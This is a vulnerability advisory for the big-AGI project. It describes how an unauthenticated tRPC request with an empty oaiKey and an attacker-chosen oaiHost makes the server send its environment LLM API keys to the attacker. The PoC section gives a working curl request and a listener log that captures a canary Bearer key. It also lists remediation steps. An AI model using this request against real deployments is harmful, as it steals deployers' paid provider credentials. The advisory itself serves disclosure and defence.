# Server-Side LLM API Key Exfiltration via Client-Controlled `oaiHost` with Environment-Key Fallback in big-AGI

| Field | Value |
|---|---|
| Project | [enricoros/big-AGI](https://github.com/enricoros/big-AGI) |
| Vulnerability Type | Credential Exposure via Server-Side Request Forgery (CWE-522 / CWE-918) |
| Severity | High — CVSS 3.1 Base Score: 7.5 |
| CVSS Vector | `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` |
| Affected Versions | <= 2.1.1 (verified on 2.1.1 @ `d27aa51`, current master) |
| Authentication | None (tRPC `edgeProcedure` carries no auth check; no auth middleware is enabled by default) |

---

## Summary

In `openai.access.ts`, the OpenAI-compatible dialects (deepseek, groq, cohere, mistral, together, and others) fall back to the server's environment keys when the client-supplied `oaiKey` is empty — while the request URL is built from the client-supplied `oaiHost` with no allowlist. An unauthenticated call to `llmOpenAI.listModels` with an empty `oaiKey` and an attacker-controlled `oaiHost` therefore makes the big-AGI server send `Authorization: Bearer <DEEPSEEK_API_KEY>` — the deployer's real, server-side secret — straight to the attacker's server. The same env-fallback pattern exists across the dialect switch and in the anthropic/gemini access modules; only the `openai` dialect implements the safe ordering.

## Details

The deepseek branch of the access switch shows the complete pattern:

```typescript
// src/modules/llms/server/openai/openai.access.ts:174
case 'deepseek':
  let deepseekKey = access.oaiKey || env.DEEPSEEK_API_KEY || '';
  const deepseekHost = llmsFixupHost(access.oaiHost || DEFAULT_DEEPSEEK_HOST, apiPath);
  ...
  return {
    headers: {
      'Authorization': `Bearer ${deepseekKey}`,
      'Content-Type': 'application/json',
    },
    url: deepseekHost + apiPath,
  };
```

Both inputs are attacker-controlled from the same unauthenticated request: the key falls back to the server's `DEEPSEEK_API_KEY` when the request supplies an empty `oaiKey`, and `llmsFixupHost` accepts any `oaiHost` (it only fixes a missing scheme). The two are then combined — secret from the server, destination from the client — and the request is dispatched from the server process. Identical `access.oaiKey || env.<PROVIDER>_KEY` fallbacks exist for the other OpenAI-compatible dialects in the same switch (groq, cohere, cerebras, etc.), so every dialect with an environment fallback shares the flaw; the `openai` dialect's own block is the one that handles trust correctly.

`llmOpenAI.listModels` is registered on `edgeProcedure`, which is a bare `t.procedure` with no auth middleware, and the Next.js middleware in the repository (`middleware_BASIC_AUTH.ts`) is not active unless separately wired up, so by default nothing stands between an anonymous caller and the server's provider credentials.

## PoC

**Real-environment reproduction** (big-AGI 2.1.1 @ `d27aa51` run locally from source for this test, started with `DEEPSEEK_API_KEY=DEEPSEEK_SK_TEST_12345_canary` — a canary secret, never a real key; an attacker-controlled HTTP listener on `127.0.0.1:8765` logs every request it receives):

```bash
# Single unauthenticated request; oaiKey EMPTY, oaiHost = attacker listener
curl -g 'http://127.0.0.1:3000/api/edge/llmOpenAI.listModels?input={"json":{"access":{"dialect":"deepseek","oaiKey":"","oaiOrg":"","oaiHost":"http://127.0.0.1:8765"}}}'
```

Server response:

```
HTTP 200 {"result":{"data":{"json":{"models":[]}}}}
```

Attacker listener log — the server's environment secret arrives as the Bearer credential:

```
=== GET /v1/models from 127.0.0.1 ===
host: 127.0.0.1:8765
authorization: Bearer DEEPSEEK_SK_TEST_12345_canary
content-type: application/json
user-agent: Next.js Middleware
x-middleware-subrequest: app/api/edge/[trpc]/route
```

The empty `oaiKey` triggered the `env.DEEPSEEK_API_KEY` fallback and the client-chosen `oaiHost` directed the resulting authenticated request to the attacker. Any host reachable from the deployment can capture the key.

![Real-environment verification](bigagi_llmopenai_env_key_exfiltration.png)

---

## Impact

- **Theft of the deployer's paid LLM credentials** — the value of `DEEPSEEK_API_KEY` (and, per the same code pattern, the environment keys of the other OpenAI-compatible providers configured on the server) is delivered to the attacker as an HTTP header; no authentication or user interaction is required.
- **Direct financial abuse** — exfiltrated provider keys are resold or burned against the victim's billing account.
- **Broad blast radius** — the fallback+client-host pattern repeats across the dialect switch and the anthropic/gemini access modules, so any provider key present in the server environment is potentially exposed through the same unauthenticated procedure family.

### Remediation

1. Never combine an environment (server-trusted) key with a client-supplied host: if `access.oaiKey` is empty, use only the deployment's configured host; if the client supplies a custom `oaiHost`, require a client-supplied key for that request.
2. Validate `oaiHost` against a server-configured allowlist, rejecting link-local, loopback-adjacent, and private ranges unless explicitly enabled.
3. Require authentication on the tRPC edge procedures (or gate `llmOpenAI`/`llmOllama`/`llmAnthropic`/`llmGemini` list-model procedures behind the deployment's auth), since `edgeProcedure` currently exposes the full provider-management surface anonymously.
4. Treat environment keys for all affected dialects as exposed in existing deployments and rotate them after upgrading.
